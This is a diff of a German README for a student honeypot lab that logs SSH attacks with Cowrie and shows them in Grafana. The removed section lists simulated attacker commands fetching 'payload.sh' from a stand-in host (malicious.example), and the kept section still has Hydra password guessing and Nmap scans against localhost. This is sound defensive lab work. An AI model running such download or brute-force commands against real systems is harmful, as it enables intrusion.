@@ -69,9 +69,9 @@ Alle Komponenten laufen als Docker-Container innerhalb derselben von Vagrant ver
 | **Vagrant** | Erstellt und provisioniert die Ubuntu-VM, inklusive Portweiterleitungen zum Hostsystem. |
 | **Docker Compose** | Erstellt, startet und verwaltet die Container der Plattform. |
 
-## Wieso diese Technologieauswahl
+## Begründung der Technologieauswahl
 
-Die Technologien wurden so gewählt, dass sich die Laborumgebung reproduzierbar aufbauen und später schrittweise erweitern lässt. In der folgende Tabelle stelle ich zu jeder eingesetzten Technologie eine mögliche Alternative gegenüber:
+Die Technologien wurden so gewählt, dass sich die Laborumgebung reproduzierbar aufbauen und später schrittweise erweitern lässt. Die folgende Tabelle stellt jeder eingesetzten Technologie eine mögliche Alternative gegenüber:
 
 | Verwendete Technologie | Mögliche Alternative | Begründung der Auswahl |
 | --- | --- | --- |
@@ -82,6 +82,7 @@ Die Technologien wurden so gewählt, dass sich die Laborumgebung reproduzierbar 
 | **Vagrant** | VirtualBox ohne Vagrant | Vagrant automatisiert Aufbau, Konfiguration und Provisionierung der VM. Dadurch lässt sich die Umgebung reproduzierbar mit `vagrant up` starten. |
 | **Docker Compose** | Kubernetes | Docker Compose ist für vier Container auf einer einzelnen Labor-VM einfacher zu konfigurieren und zu betreiben. Kubernetes wäre für diesen Projektumfang unnötig komplex. |
 
+Die Kombination unterstützt damit sowohl die einfache Grundversion der Modularbeit als auch die spätere Erweiterung zur zentralen Monitoring-Plattform.
 
 ## Voraussetzungen
 
@@ -142,17 +143,133 @@ Nach der Anmeldung in Grafana ist Loki bereits als Standard-Datenquelle eingeric
 
 Die Beispiel-Zugangsdaten von Cowrie und Grafana sind absichtlich einfach und nur für das isolierte Labor vorgesehen.
 
-## Angriffssimulation
+## Testanleitung für die Phasen
 
-Die folgenden Befehle werden auf dem Hostsystem ausgeführt und richten sich ausschliesslich gegen `127.0.0.1` beziehungsweise die eigene VM.
+Die folgenden Schritte zeigen, wie die Ergebnisse beider Phasen überprüft werden können. Die vollständige Plattform bleibt dabei gestartet: Für Phase 1 wird nur die Grundfunktion von Cowrie geprüft, für Phase 2 zusätzlich die Weiterleitung und Visualisierung. Ein Umbau oder Abschalten einzelner Dienste ist nicht notwendig.
 
-Für die direkte Auswertung aus Phase 1 können die Cowrie-Ereignisse parallel in einem zweiten Terminal verfolgt werden:
+### Vorbereitung
+
+Die Installation gemäss **Setup und Start** abschliessen und zwei Terminalfenster auf dem eigenen Computer, beispielsweise dem Mac, öffnen. Für die Pflichtprüfung werden nur SSH und für Phase 2 ein Browser benötigt; Nmap und Hydra sind optional.
+
+**Terminal A – Verbindung zum Vagrant-Server herstellen:** Zuerst im lokalen Terminal in den Projektunterordner `honeypot-vm` wechseln. Falls man bereits dort ist, entfällt `cd honeypot-vm`. Vom Projektverzeichnis aus:
 
 ```bash
-vagrant ssh -c "sudo tail -f /var/lib/docker/volumes/honeypot_cowrie-data/_data/log/cowrie/cowrie.json"
+cd honeypot-vm
+vagrant ssh
 ```
 
-In Phase 2 lassen sich dieselben Ereignisse im Grafana-Dashboard und mit den weiter unten aufgeführten LogQL-Abfragen untersuchen.
+Ab jetzt ist **Terminal A auf dem Vagrant-Server (Ubuntu-VM)** angemeldet. Dort werden die Protokolle gelesen und die Docker-Dienste geprüft. `vagrant`-Befehle werden dagegen immer auf dem lokalen Computer ausgeführt, nicht innerhalb dieser Server-Shell.
+
+**Terminal B – lokal bleiben:** Das zweite Terminal bleibt zunächst auf dem eigenen Computer. Von dort wird die SSH-Verbindung zu Cowrie auf Port `2222` gestartet. Vagrant leitet `127.0.0.1:2222` vom lokalen Computer an Cowrie in der VM weiter.
+
+| Fenster / Umgebung | Verwendung |
+| --- | --- |
+| **Terminal A: Vagrant-Server** | Nach `vagrant ssh`: echte Ubuntu-Shell zum Lesen der JSON-Protokolle und Prüfen der Container. |
+| **Terminal B: lokaler Computer** | SSH-Verbindung zu Cowrie starten; optionale Nmap- und Hydra-Tests ausführen. |
+| **Terminal B: Cowrie-Shell** | Nach erfolgreicher SSH-Anmeldung auf Port `2222`: Testbefehle im simulierten System eingeben. Mit `exit` gelangt man zurück auf den lokalen Computer. |
+| **Browser: lokaler Computer** | Loki-Status und Grafana über `localhost` öffnen. |
+
+> Die Server-Shell in Terminal A und die simulierte Cowrie-Shell in Terminal B sind nicht dasselbe: Verwaltungsbefehle gehören auf den Vagrant-Server, simulierte Angreiferbefehle ausschliesslich in die Cowrie-Shell.
+
+### Phase 1 testen – Cowrie und lokale Protokollierung
+
+**1. Protokolle beobachten – Terminal A, auf dem Vagrant-Server:** Nach der Anmeldung mit `vagrant ssh` die laufende Log-Anzeige starten:
+
+```bash
+sudo tail -f /var/lib/docker/volumes/honeypot_cowrie-data/_data/log/cowrie/cowrie.json
+```
+
+Der Befehl liest das Docker-Volume direkt in der VM. Er benötigt kein `tail` innerhalb des Cowrie-Containers. Der Pfad gilt für den voreingestellten Compose-Projektnamen `honeypot`. Falls die Datei beim ersten Start noch fehlt, zuerst Schritt 2 ausführen und den Log-Befehl erneut starten.
+
+**2. Fehlgeschlagene und erfolgreiche Anmeldung erzeugen – Terminal B, lokal auf dem eigenen Computer:** Die Verbindung zum Honeypot starten:
+
+```bash
+ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 2222 root@127.0.0.1
+```
+
+Beim ersten Verbindungsaufbau die Hostschlüssel-Abfrage für die eigene Laborumgebung mit `yes` bestätigen. Bei der Passwortabfrage zunächst absichtlich `falsch123` eingeben. Nach der Ablehnung bei der nächsten Passwortabfrage `toor` eingeben. Während der Passworteingabe werden keine Zeichen angezeigt.
+
+**3. Befehle protokollieren – Terminal B, jetzt in der Cowrie-Shell:** Nach der erfolgreichen Anmeldung diese Befehle nur im simulierten Honeypot eingeben:
+
+```bash
+whoami
+uname -a
+echo TEKO-PHASE1-TEST
+exit
+```
+
+Mit `exit` wird die Cowrie-Sitzung beendet. Terminal B ist danach wieder auf dem lokalen Computer.
+
+**4. Ergebnis kontrollieren – Terminal A, auf dem Vagrant-Server:** In der laufenden Log-Anzeige sollten passende JSON-Ereignisse erscheinen:
+
+| Testschritt | Erwartetes Ereignis / Prüfkriterium |
+| --- | --- |
+| SSH-Verbindung öffnen | `cowrie.session.connect` |
+| Passwort `falsch123` verwenden | `cowrie.login.failed` |
+| Passwort `toor` verwenden | `cowrie.login.success` |
+| Befehle eingeben | `cowrie.command.input`; das Feld `input` enthält unter anderem `echo TEKO-PHASE1-TEST`. |
+| Sitzung mit `exit` beenden | `cowrie.session.closed` |
+
+**Phase 1 ist erfolgreich geprüft**, wenn der Login-Test und die eingegebenen Befehle in den JSON-Protokollen auf dem Vagrant-Server nachvollziehbar sind. Grafana ist für diesen Nachweis nicht erforderlich. Die Log-Anzeige kann für Phase 2 geöffnet bleiben; `Ctrl+C` beendet nur die Anzeige, nicht den Honeypot. Terminal A bleibt danach in der Ubuntu-Shell; erst `exit` führt zurück zum lokalen Computer.
+
+### Phase 2 testen – Log-Pipeline und Grafana
+
+**1. Dienste und Dashboard prüfen – Browser auf dem lokalen Computer:** Unter <http://localhost:3100/ready> muss nach der Startphase `ready` erscheinen. Anschliessend <http://localhost:3000> öffnen und mit `admin` / `admin` anmelden, sofern das Passwort nicht bereits geändert wurde. Im Ordner **Honeypot** das Dashboard **Cowrie Honeypot Overview** öffnen und den Zeitraum auf **Letzte 15 Minuten** setzen.
+
+**2. Neue, eindeutig erkennbare Testdaten erzeugen – Terminal B:** Zunächst **lokal auf dem eigenen Computer** die SSH-Verbindung erneut starten:
+
+```bash
+ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 2222 root@127.0.0.1
+```
+
+Wieder zuerst `falsch123`, danach `toor` eingeben. Nach erfolgreicher Anmeldung **in der Cowrie-Shell** ausführen:
+
+```bash
+echo TEKO-PHASE2-TEST
+echo TEKO-PHASE2-payload-TEST
+exit
+```
+
+Nach `exit` ist Terminal B wieder lokal. Der zweite Befehl ist harmlos. Das Wort `payload` löst lediglich den vorhandenen Suchfilter für verdächtige Befehle aus; es wird nichts heruntergeladen oder installiert. Der Filter ist eine einfache Stichwortsuche und kein Beweis für einen tatsächlichen Angriff.
+
+**3. Anzeige überprüfen – Grafana im lokalen Browser:** Einige Sekunden auf die Weiterleitung warten und das Dashboard aktualisieren. Die folgenden Panels sollten die neuen Ereignisse im ausgewählten Zeitraum berücksichtigen:
+
+| Panel | Erwartetes Ergebnis |
+| --- | --- |
+| **SSH Sessions** | Die neue SSH-Verbindung wird mitgezählt. |
+| **Failed Logins** / **Successful Logins** | Der fehlgeschlagene und der erfolgreiche Login werden mitgezählt. |
+| **Attack Events Over Time** | Die neu erzeugten Cowrie-Ereignisse erscheinen in der Zeitreihe. |
+| **Executed Commands** | Die beiden Befehle mit `TEKO-PHASE2` sind sichtbar. |
+| **Suspicious Commands** | `echo TEKO-PHASE2-payload-TEST` erscheint wegen des Stichworts `payload`. |
+
+Bereits vorhandene Tests können in die Zähler einfliessen. Deshalb sind die markierten Befehle der eindeutigere Nachweis als ein bestimmter Gesamtwert.
+
+**4. Log-Pipeline gezielt nachweisen – Grafana im lokalen Browser:** Unter **Explore** die Datenquelle **Loki** und ebenfalls **Letzte 15 Minuten** auswählen. Diese LogQL-Abfrage in Grafana ausführen, nicht in einem Terminal:
+
+```logql
+{job="cowrie", eventid="cowrie.command.input"} |= "TEKO-PHASE2"
+```
+
+Die Einträge mit den beiden Testbefehlen müssen sowohl im JSON-Log auf dem Vagrant-Server (Terminal A) als auch in Grafana auffindbar sein. Wiederholte Tests können zusätzliche Treffer erzeugen; zur Zuordnung die Zeitstempel vergleichen.
+
+**Phase 2 ist erfolgreich geprüft**, wenn dieselben neuen Ereignisse über die Kette Cowrie → JSON-Log → Promtail → Loki bis nach Grafana gelangen und dort abgefragt sowie im Dashboard angezeigt werden.
+
+### Falls ein Test nicht funktioniert
+
+Für die folgenden Server-Prüfbefehle in Terminal A zunächst die Log-Anzeige mit `Ctrl+C` beenden. Terminal A muss weiterhin auf dem Vagrant-Server angemeldet sein.
+
+| Beobachtung | Nächster Prüfschritt |
+| --- | --- |
+| SSH-Verbindung zu Cowrie wird abgelehnt | In **Terminal A auf dem Server** `cd /project && docker compose ps` ausführen. Cowrie muss laufen; die Testverbindung aus **Terminal B lokal** muss Port `2222` verwenden. Falls bereits `vagrant ssh` nicht funktioniert, **lokal** im Ordner `honeypot-vm` mit `vagrant status` den VM-Status prüfen. |
+| Keine neuen JSON-Ereignisse auf dem Server | In **Terminal A auf dem Server** die Log-Anzeige aus Schritt 1 erneut starten. In **Terminal B lokal** eine neue SSH-Verbindung zu Cowrie erzeugen. Prüfen, ob der Standard-Projektname `honeypot` verwendet wird. |
+| Ereignisse auf dem Server vorhanden, aber keine Treffer in Grafana | Im **lokalen Browser** Zeitraum und Datenquelle kontrollieren, kurz warten und aktualisieren. Danach in **Terminal A auf dem Server** `cd /project && docker compose logs --tail=100 promtail loki` auf Weiterleitungsfehler prüfen. |
+| Explore zeigt Treffer, aber ein Dashboard-Panel bleibt leer | Dashboard-Zeitraum prüfen und aktualisieren. Für **Suspicious Commands** muss der Testbefehl das Wort `payload` enthalten. |
+
+Als Abgabenachweis eignen sich ein Ausschnitt der JSON-Log-Anzeige aus Terminal A für Phase 1 und ein Screenshot von Dashboard beziehungsweise Explore mit den markierten Testbefehlen für Phase 2.
+
+## Optionale Angriffssimulationen
+
+Die folgenden zusätzlichen Tests werden in **Terminal B lokal auf dem eigenen Computer** ausgeführt, nicht auf dem Vagrant-Server und nicht in der Cowrie-Shell. Falls noch eine Cowrie-Sitzung offen ist, zuerst mit `exit` zurückkehren. Die Tests richten sich ausschliesslich gegen die eigene Laborumgebung. Die Ergebnisse lassen sich in Terminal A in den JSON-Protokollen (Phase 1) und im lokalen Browser in Grafana (Phase 2) überprüfen.
 
 ### Portscan mit Nmap
 
@@ -164,7 +281,7 @@ Der Scan sollte einen SSH-Dienst erkennen. Typische Cowrie-Ereignisse sind `cowr
 
 ### Login-Versuche mit Hydra
 
-Eine kleine Testliste erstellen und gegen Cowrie verwenden (hydra muss dafür lokal installiert sein):
+Eine kleine Testliste erstellen und gegen Cowrie verwenden:
 
 ```bash
 printf "admin\npassword\n123456\ntoor\n" > passwords.txt
@@ -172,27 +289,6 @@ hydra -l root -P passwords.txt ssh://127.0.0.1:2222
 ```
 
 Dabei entstehen unter anderem die Ereignisse `cowrie.login.failed` und `cowrie.login.success`. Nmap und Hydra sind optionale Testwerkzeuge und werden nicht für den Betrieb der Plattform benötigt.
-
-### Interaktive SSH-Sitzung
-
-```bash
-ssh -p 2222 root@127.0.0.1
-```
-
-Als Passwort wird `toor` verwendet. In der simulierten Shell können beispielsweise folgende Befehle eingegeben werden:
-
-```bash
-whoami
-uname -a
-id
-ls -la
-wget http://malicious.example/payload.sh
-curl http://malicious.example/payload.sh -o /tmp/payload.sh
-chmod +x /tmp/payload.sh
-exit
-```
-
-Cowrie führt diese Aktionen nicht auf dem Hostsystem aus, sondern simuliert sie und protokolliert die Eingaben als `cowrie.command.input`. Im Grafana-Dashboard sollten danach die Anzahl der Sitzungen sowie die Panels für ausgeführte und verdächtige Befehle aktualisiert werden.
 
 ## Wichtigste LogQL-Abfragen
 
